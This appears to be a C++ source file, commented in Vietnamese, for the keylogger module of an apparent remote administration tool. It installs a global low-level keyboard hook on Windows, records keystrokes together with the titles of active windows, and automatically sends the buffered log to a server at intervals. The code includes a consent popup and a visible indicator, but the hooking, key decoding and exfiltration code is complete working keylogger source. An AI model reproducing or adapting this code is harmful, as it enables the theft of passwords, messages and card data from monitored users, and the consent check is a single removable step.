#include "ModuleKeylogger.h"
#include <psapi.h>      // QueryFullProcessImageNameA
#include <chrono>
#include <ctime>
#include <sstream>

#pragma comment(lib, "psapi.lib")

// ==================================================================
// Khởi tạo biến static
// ==================================================================
HHOOK            ModuleKeylogger::s_hHook    = NULL;
ModuleKeylogger* ModuleKeylogger::s_instance = nullptr;

// ==================================================================
// Constructor / Destructor
// ==================================================================
ModuleKeylogger::ModuleKeylogger()
    : m_isRunning(false)
    , m_hookThreadId(0)
    , m_targetPid(0)
    , m_lastForeground(NULL)
{
    s_instance = this;
}

ModuleKeylogger::~ModuleKeylogger() {
    if (m_isRunning) {
        StopLogging();
    }
    s_instance = nullptr;
}

// ==================================================================
// Public: StartLogging
// ==================================================================
json ModuleKeylogger::StartLogging(DWORD pid, KeyloggerCallback callback) {
    if (m_isRunning) {
        return {
            {"module",  "keylogger"},
            {"status",  "error"},
            {"message", "Keylogger đang hoạt động. Gọi stop trước khi bắt đầu lại."}
        };
    }

    // Bước 1: Hiển thị popup xin phép — bắt buộc trước khi làm bất cứ điều gì
    if (!RequestUserConsent(pid)) {
        return {
            {"module",  "keylogger"},
            {"status",  "denied"},
            {"message", "Người dùng từ chối cấp quyền giám sát bàn phím."}
        };
    }

    // Bước 2: Thiết lập trạng thái
    m_targetPid       = pid;
    m_callback        = callback;
    m_lastForeground  = NULL;
    m_isRunning       = true;

    // Bước 3: Xóa buffer cũ
    {
        std::lock_guard<std::mutex> lock(m_logMutex);
        m_logBuffer.clear();
    }

    // Bước 4: Khởi động luồng Hook (Message Pump)
    m_hookThread = std::thread(&ModuleKeylogger::HookThreadWorker, this);

    // Bước 5: Khởi động luồng tự động Flush
    m_flushThread = std::thread(&ModuleKeylogger::AutoFlushWorker, this);

    // Bước 6: Bật đèn chấm đỏ nhấp nháy cảnh báo keylogger đang hoạt động
    SetIndicatorState(STATE_FLASHING);

    return {
        {"module",     "keylogger"},
        {"status",     "ok"},
        {"message",    "Đã bắt đầu ghi bàn phím. Người dùng đã xác nhận."},
        {"target_pid", pid},
        {"flush_interval_sec", AUTO_FLUSH_INTERVAL_SEC}
    };
}

// ==================================================================
// Public: StopLogging
// ==================================================================
json ModuleKeylogger::StopLogging() {
    if (!m_isRunning) {
        return {
            {"module",  "keylogger"},
            {"status",  "error"},
            {"message", "Keylogger chưa được khởi động."}
        };
    }

    // Bước 1: Đặt cờ thoát — AutoFlushWorker và HookThreadWorker sẽ tự dừng
    m_isRunning = false;

    // Bước 2: Đẩy WM_QUIT vào queue của hook thread để thoát PeekMessage ngay lập tức
    DWORD tid = m_hookThreadId.load();
    if (tid != 0) {
        PostThreadMessage(tid, WM_QUIT, 0, 0);
    }

    // Bước 3: Đợi các luồng kết thúc
    if (m_hookThread.joinable())  m_hookThread.join();
    if (m_flushThread.joinable()) m_flushThread.join();
    m_hookThreadId.store(0);

    // Bước 4: Flush lần cuối và gửi về server
    std::string finalSnapshot;
    {
        std::lock_guard<std::mutex> lock(m_logMutex);
        finalSnapshot = m_logBuffer;
        m_logBuffer.clear();
    }

    if (!finalSnapshot.empty() && m_callback) {
        json finalFlush = {
            {"module",     "keylogger"},
            {"status",     "ok"},
            {"event",      "final_flush"},
            {"data",       finalSnapshot},
            {"is_running", false}
        };
        m_callback(finalFlush.dump());
    }

    // Tắt đèn chấm đỏ khi dừng keylogger
    SetIndicatorState(STATE_OFF);

    return {
        {"module",  "keylogger"},
        {"status",  "ok"},
        {"message", "Đã dừng ghi bàn phím."}
    };
}

// ==================================================================
// Public: FlushLog — Network client gọi thủ công khi cần
// ==================================================================
json ModuleKeylogger::FlushLog() {
    std::lock_guard<std::mutex> lock(m_logMutex);

    json result = {
        {"module",     "keylogger"},
        {"status",     "ok"},
        {"data",       m_logBuffer},
        {"is_running", m_isRunning.load()}
    };

    m_logBuffer.clear();
    return result;
}

// ==================================================================
// Private: RequestUserConsent — Popup blocking, phải nhấn Yes/No
// ==================================================================
bool ModuleKeylogger::RequestUserConsent(DWORD pid) {
    // Lấy tên tiến trình (nếu pid != 0)
    std::string targetDesc = "Toàn hệ thống (tất cả ứng dụng)";
    if (pid != 0) {
        HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (hProc) {
            char nameBuf[MAX_PATH] = {};
            DWORD size = MAX_PATH;
            if (QueryFullProcessImageNameA(hProc, 0, nameBuf, &size)) {
                std::string fullPath(nameBuf);
                size_t pos = fullPath.find_last_of("\\/");
                targetDesc = (pos != std::string::npos)
                    ? fullPath.substr(pos + 1)
                    : fullPath;
            } else {
                targetDesc = "PID " + std::to_string(pid);
            }
            CloseHandle(hProc);
        } else {
            targetDesc = "PID " + std::to_string(pid) + " (không tìm thấy)";
        }
    }

    // Nội dung popup rõ ràng, có cảnh báo mật khẩu
    std::string message =
        "CẢNH BÁO: YÊU CẦU GIÁM SÁT BÀN PHÍM\n"
        "=========================================\n\n"
        "Phiên quản lý từ xa đang yêu cầu ghi lại\n"
        "tất cả các phím ghi nhận trên bàn phím.\n\n"
        "Phạm vi giám sát:\n  >> " + targetDesc + "\n\n"
        "Lưu ý: Tính năng này có thể ghi lại:\n"
        "  - Mật khẩu và thông tin đăng nhập\n"
        "  - Tin nhắn riêng tư\n"
        "  - Dữ liệu thẻ ngân hàng\n\n"
        "Bạn có ĐỒNG Ý cho phép ghi bàn phím?";

    // Sử dụng MessageBoxA blocking vì StartLogging cần kết quả đồng bộ
    // (Keylogger cần biết ngay lập tức có được phép hay không để return json)
    int result = MessageBoxA(
        NULL,
        message.c_str(),
        "Yêu cầu quyền giám sát bàn phím",
        MB_YESNO           // Hai nút Yes/No
        | MB_ICONWARNING   // Biểu tượng cảnh báo
        | MB_DEFBUTTON2    // Nút mặc định là "No" để an toàn
        | MB_SYSTEMMODAL   // Nổi trên tất cả cửa sổ
        | MB_SETFOREGROUND // Đưa lên foreground
    );

    return (result == IDYES);
}

// ==================================================================
// Private: HookThreadWorker — Chạy message pump + hook trên luồng riêng
// ==================================================================
void ModuleKeylogger::HookThreadWorker() {
    // Lưu Thread ID ngay lập tức để StopLogging có thể gọi PostThreadMessage
    m_hookThreadId.store(GetCurrentThreadId());

    // Cài đặt hook toàn cục WH_KEYBOARD_LL
    // PHẢI gọi trên cùng luồng với message pump để nhận callback
    s_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (!s_hHook) {
        DWORD err = GetLastError();
        AppendToLog("[LOI: Không thể cài đặt hook WH_KEYBOARD_LL. GetLastError = "
                    + std::to_string(err) + "]\n");
        m_isRunning = false;
        return;
    }

    // Ghi header log với timestamp bắt đầu
    {
        auto now = std::chrono::system_clock::now();
        std::time_t t = std::chrono::system_clock::to_time_t(now);
        char timeBuf[32] = {};
        struct tm tms;
        localtime_s(&tms, &t);
        strftime(timeBuf, sizeof(timeBuf), "%Y-%m-%d %H:%M:%S", &tms);
        AppendToLog(std::string("[=== Keylogger Started: ") + timeBuf + " ===]\n");
    }

    // ---------------------------------------------------------------
    // Message Pump — bắt buộc để WH_KEYBOARD_LL hoạt động.
    // Dùng PeekMessage + Sleep(1) thay vì GetMessage để:
    //   1. Kiểm tra m_isRunning mỗi 1ms
    //   2. Thoát ngay khi nhận WM_QUIT từ StopLogging()
    // ---------------------------------------------------------------
    MSG msg;
    bool quit = false;

    while (m_isRunning && !quit) {
        // Xử lý tất cả message trong queue
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_QUIT) {
                quit = true;
                break;
            }
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        if (!quit) {
            // Ngủ 1ms để nhường CPU, tránh busy-wait
            // Hook callback vẫn sẽ được gọi bình thường vì Windows
            // deliver WH_KEYBOARD_LL qua cơ chế riêng
            Sleep(1);
        }
    }

    // Gỡ hook khi thoát
    if (s_hHook) {
        UnhookWindowsHookEx(s_hHook);
        s_hHook = NULL;
    }

    AppendToLog("[=== Keylogger Stopped ===]\n");
}

// ==================================================================
// Private: AutoFlushWorker — Tự động gửi log về server mỗi N giây
// ==================================================================
void ModuleKeylogger::AutoFlushWorker() {
    while (m_isRunning) {
        // Ngủ theo từng giây để thoát nhanh khi m_isRunning = false
        for (int i = 0; i < AUTO_FLUSH_INTERVAL_SEC && m_isRunning; ++i) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }

        if (!m_isRunning) break;

        // Lấy snapshot và xóa buffer
        std::string snapshot;
        {
            std::lock_guard<std::mutex> lock(m_logMutex);
            if (m_logBuffer.empty()) continue;
            snapshot = m_logBuffer;
            m_logBuffer.clear();
        }

        // Gửi về server qua callback (callback được đăng ký từ Network layer)
        if (!snapshot.empty() && m_callback) {
            json logData = {
                {"module",     "keylogger"},
                {"status",     "ok"},
                {"event",      "auto_flush"},
                {"data",       snapshot},
                {"is_running", true}
            };
            m_callback(logData.dump());
        }
    }
}

// ==================================================================
// Private: AppendToLog — Ghi vào buffer (thread-safe)
// ==================================================================
void ModuleKeylogger::AppendToLog(const std::string& text) {
    std::lock_guard<std::mutex> lock(m_logMutex);
    m_logBuffer += text;
}

// ==================================================================
// Static: LowLevelKeyboardProc — Hook Callback chính
// ==================================================================
LRESULT CALLBACK ModuleKeylogger::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Theo MSDN: nCode < 0 -> không xử lý, chuyển tiếp ngay lập tức
    if (nCode < 0 || !s_instance || !s_instance->m_isRunning) {
        return CallNextHookEx(s_hHook, nCode, wParam, lParam);
    }

    // Chỉ xử lý WM_KEYDOWN và WM_SYSKEYDOWN
    // Bỏ qua WM_KEYUP để tránh log trùng lặp
    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
        KBDLLHOOKSTRUCT* kbs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

        // --- Lọc theo PID (nếu được chỉ định) ---
        if (s_instance->m_targetPid != 0) {
            HWND fgWnd = GetForegroundWindow();
            DWORD fgPid = 0;
            GetWindowThreadProcessId(fgWnd, &fgPid);
            if (fgPid != s_instance->m_targetPid) {
                return CallNextHookEx(s_hHook, nCode, wParam, lParam);
            }
        }

        // --- Theo dõi thay đổi cửa sổ đang focus ---
        // Mỗi khi người dùng chuyển ứng dụng, log tiêu đề cửa sổ mới
        HWND currentFg = GetForegroundWindow();
        if (currentFg && currentFg != s_instance->m_lastForeground) {
            s_instance->m_lastForeground = currentFg;

            char winTitle[256] = {};
            GetWindowTextA(currentFg, winTitle, sizeof(winTitle));

            auto now = std::chrono::system_clock::now();
            std::time_t t = std::chrono::system_clock::to_time_t(now);
            char timeBuf[16] = {};
            struct tm tms;
            localtime_s(&tms, &t);
            strftime(timeBuf, sizeof(timeBuf), "%H:%M:%S", &tms);

            s_instance->AppendToLog(
                "\n[" + std::string(timeBuf) + "] [" + std::string(winTitle) + "]\n"
            );
        }

        // --- Đọc trạng thái modifier keys ---
        bool shiftPressed = (GetAsyncKeyState(VK_SHIFT)   & 0x8000) != 0;
        bool capsActive   = (GetKeyState(VK_CAPITAL)      & 0x0001) != 0;
        bool ctrlPressed  = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
        bool altPressed   = (GetAsyncKeyState(VK_MENU)    & 0x8000) != 0;

        // --- Log Ctrl+Key combo (Ctrl+C, Ctrl+V, Ctrl+Z, ...) ---
        if (ctrlPressed && !altPressed) {
            DWORD vk = kbs->vkCode;
            if (vk >= 'A' && vk <= 'Z') {
                s_instance->AppendToLog("[Ctrl+" + std::string(1, (char)vk) + "]");
                return CallNextHookEx(s_hHook, nCode, wParam, lParam);
            }
        }

        // --- Log Alt+Key combo ---
        if (altPressed && !ctrlPressed) {
            DWORD vk = kbs->vkCode;
            if (vk >= 'A' && vk <= 'Z') {
                s_instance->AppendToLog("[Alt+" + std::string(1, (char)vk) + "]");
                return CallNextHookEx(s_hHook, nCode, wParam, lParam);
            }
            // Alt+F4, Alt+Tab thường gặp
            if (vk == VK_F4)  { s_instance->AppendToLog("[Alt+F4]");  return CallNextHookEx(s_hHook, nCode, wParam, lParam); }
            if (vk == VK_TAB) { s_instance->AppendToLog("[Alt+Tab]"); return CallNextHookEx(s_hHook, nCode, wParam, lParam); }
        }

        // --- Chuyển đổi VK sang chuỗi và ghi vào buffer ---
        std::string keyText = VkToString(kbs->vkCode, shiftPressed, capsActive);
        if (!keyText.empty()) {
            s_instance->AppendToLog(keyText);
        }
    }

    // Luôn chuyển tiếp hook — không bao giờ chặn input của người dùng
    return CallNextHookEx(s_hHook, nCode, wParam, lParam);
}

// ==================================================================
// Static: VkToString — Map mã Virtual-Key sang chuỗi đọc được
//         Layout chuẩn US QWERTY
// ==================================================================
std::string ModuleKeylogger::VkToString(DWORD vkCode, bool shiftPressed, bool capsActive) {

    // --- Phím đặc biệt (không thay đổi theo Shift/Caps) ---
    switch (vkCode) {
        // Ký tự whitespace và điều khiển
        case VK_RETURN:   return "\n";
        case VK_SPACE:    return " ";
        case VK_TAB:      return "[Tab]";
        case VK_BACK:     return "[BackSp]";
        case VK_DELETE:   return "[Del]";
        case VK_ESCAPE:   return "[Esc]";

        // Điều hướng
        case VK_LEFT:     return "[<-]";
        case VK_RIGHT:    return "[->]";
        case VK_UP:       return "[Up]";
        case VK_DOWN:     return "[Dn]";
        case VK_HOME:     return "[Home]";
        case VK_END:      return "[End]";
        case VK_PRIOR:    return "[PgUp]";
        case VK_NEXT:     return "[PgDn]";
        case VK_INSERT:   return "[Ins]";
        case VK_SNAPSHOT: return "[PrtSc]";

        // Phím chức năng F1-F12
        case VK_F1:  return "[F1]";  case VK_F2:  return "[F2]";
        case VK_F3:  return "[F3]";  case VK_F4:  return "[F4]";
        case VK_F5:  return "[F5]";  case VK_F6:  return "[F6]";
        case VK_F7:  return "[F7]";  case VK_F8:  return "[F8]";
        case VK_F9:  return "[F9]";  case VK_F10: return "[F10]";
        case VK_F11: return "[F11]"; case VK_F12: return "[F12]";

        // Modifier — không log bản thân phím, chỉ log khi kết hợp (đã xử lý ở trên)
        case VK_LSHIFT:   case VK_RSHIFT:   return "";
        case VK_LCONTROL: case VK_RCONTROL: return "";
        case VK_LMENU:    case VK_RMENU:    return ""; // Alt đã xử lý ở trên
        case VK_LWIN:     case VK_RWIN:     return "[Win]";
        case VK_APPS:                       return "[Menu]";

        // Toggle keys
        case VK_CAPITAL:  return "[CapsLk]";
        case VK_NUMLOCK:  return "[NumLk]";
        case VK_SCROLL:   return "[ScrLk]";

        // Numpad (khi NumLock bật — NumLock tắt sẽ fall through sang VK_HOME, VK_END, v.v.)
        case VK_NUMPAD0: return "0"; case VK_NUMPAD1: return "1";
        case VK_NUMPAD2: return "2"; case VK_NUMPAD3: return "3";
        case VK_NUMPAD4: return "4"; case VK_NUMPAD5: return "5";
        case VK_NUMPAD6: return "6"; case VK_NUMPAD7: return "7";
        case VK_NUMPAD8: return "8"; case VK_NUMPAD9: return "9";
        case VK_MULTIPLY: return "*";
        case VK_ADD:      return "+";
        case VK_SUBTRACT: return "-";
        case VK_DECIMAL:  return ".";
        case VK_DIVIDE:   return "/";

        default: break;
    }

    // --- Chữ cái A-Z ---
    if (vkCode >= 'A' && vkCode <= 'Z') {
        // Logic: CapsLock XOR Shift quyết định hoa/thường
        // Caps ON  + Shift OFF = Hoa
        // Caps OFF + Shift ON  = Hoa
        // Caps ON  + Shift ON  = Thường
        // Caps OFF + Shift OFF = Thường
        bool isUpper = (capsActive ^ shiftPressed);
        char c = isUpper ? (char)vkCode : (char)(vkCode + 32);
        return std::string(1, c);
    }

    // --- Số 0-9 (hàng số phía trên bàn phím, không phải numpad) ---
    if (vkCode >= '0' && vkCode <= '9') {
        if (!shiftPressed) {
            return std::string(1, (char)vkCode);
        }
        // Shift + số -> ký tự đặc biệt (layout US QWERTY)
        //        0    1    2    3    4    5    6    7    8    9
        static const char shiftNum[10] = { ')', '!', '@', '#', '$', '%', '^', '&', '*', '(' };
        return std::string(1, shiftNum[vkCode - '0']);
    }

    // --- Ký tự đặc biệt (layout US QWERTY) ---
    struct VkCharMap { DWORD vk; char normal; char shifted; };
    static const VkCharMap specialMap[] = {
        // VK Code          Normal   Shifted
        { VK_OEM_MINUS,     '-',     '_'  },  // Dấu gạch ngang
        { VK_OEM_PLUS,      '=',     '+'  },  // Dấu bằng
        { VK_OEM_4,         '[',     '{'  },  // Ngoặc vuông mở
        { VK_OEM_6,         ']',     '}'  },  // Ngoặc vuông đóng
        { VK_OEM_5,         '\\',    '|'  },  // Backslash
        { VK_OEM_1,         ';',     ':'  },  // Chấm phẩy
        { VK_OEM_7,         '\'',    '"'  },  // Nháy đơn
        { VK_OEM_COMMA,     ',',     '<'  },  // Dấu phẩy
        { VK_OEM_PERIOD,    '.',     '>'  },  // Dấu chấm
        { VK_OEM_2,         '/',     '?'  },  // Dấu gạch chéo
        { VK_OEM_3,         '`',     '~'  },  // Backtick
    };

    for (const auto& entry : specialMap) {
        if (vkCode == entry.vk) {
            char c = shiftPressed ? entry.shifted : entry.normal;
            return std::string(1, c);
        }
    }

    // Phím không nhận diện được -> bỏ qua (không thêm ký tự lạ vào log)
    return "";
}
